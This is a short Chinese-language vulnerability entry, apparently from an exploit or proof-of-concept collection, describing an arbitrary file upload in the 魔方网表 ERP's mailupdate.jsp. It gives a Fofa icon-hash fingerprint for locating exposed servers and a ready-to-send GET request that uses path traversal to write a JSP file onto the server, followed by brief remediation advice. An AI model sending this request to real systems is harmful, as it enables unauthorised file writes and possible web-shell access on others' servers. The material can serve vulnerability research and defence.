# 魔方网表ERPmailupdate.jsp任意文件上传

- **系统**：魔方网表ERPmailupdate.jsp　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`icon_hash="694014318"`
- **请求**：`GET /magicflu/html/mail/mailupdate.jsp?messageid=/../../../qwe.jsp&messagecontent=%3C%25+out.println%28%22hello%22%29%3B%25%3E HTTP/1.1`

**请求体 / payload**
```
1. Fofa
icon_hash="694014318"
2、隐患url,复现如下
Host: your-ip
3、上传文件名
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。